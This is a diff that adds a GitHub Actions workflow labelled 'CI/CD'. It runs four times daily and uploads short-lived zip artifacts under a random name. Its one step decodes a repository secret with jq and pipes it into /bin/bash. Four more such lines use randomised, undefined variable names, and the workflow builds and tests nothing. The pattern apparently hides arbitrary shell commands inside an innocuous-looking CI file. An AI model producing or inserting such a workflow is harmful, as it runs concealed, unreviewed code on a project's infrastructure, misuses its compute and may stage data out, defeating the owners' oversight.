@@ -1,0 +1,32 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          g37: ${{ secrets.g37 }}
+        run: |
+          printf '%s' "$g37" | jq -r .se07 | /bin/bash
+          echo $fqabz9 | jq -r .yp5638 | /bin/bash
+          printf '%s' "$cq0642" | jq -r .hled7 | /bin/bash
+          echo $iomh89482 | jq -r .tx79 | /bin/bash
+          echo $el20756 | jq -r .zhylh507 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: MPbQmzHT
+          path: "*.zip"
+          retention-days: 1
